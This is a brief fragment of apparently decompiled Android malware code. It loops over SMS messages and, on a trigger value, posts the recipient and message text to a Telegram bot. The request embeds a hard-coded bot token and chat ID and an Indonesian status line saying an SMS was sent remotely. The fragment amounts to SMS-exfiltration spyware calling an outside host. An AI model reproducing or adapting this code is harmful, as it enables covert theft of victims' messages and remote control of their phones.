                    ...
                    while (i < smsMessageArr.length) {
                        ...
                        if (parseInt == 55555) {
                            ...
                            try {
                                String str9 = str6;
                                String str10 = str9;
                                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7389558566:AAF8hLasottYsDY3PIzvVU_8PZryZsQpJZk/sendMessage?parse_mode=markdown&chat_id=5267098233&text=Berhasil Kirim SMS dari Jauh  %0AKepada  : _" + str5 + "_,%0A𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : _" + str9 + "_").build()).enqueue(new Callback() {
